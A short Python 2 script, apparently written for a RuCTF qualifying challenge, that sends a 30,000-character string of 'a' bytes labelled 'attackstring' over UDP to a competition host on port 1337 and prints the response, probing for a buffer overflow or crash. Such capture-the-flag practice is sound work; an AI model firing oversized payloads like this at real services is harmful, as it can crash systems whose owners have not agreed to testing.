import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.connect(('udp.quals.ructf.org', 1337))

attackstring = 'a' * 30000


sock.sendall(attackstring)
print sock.recv(1024)
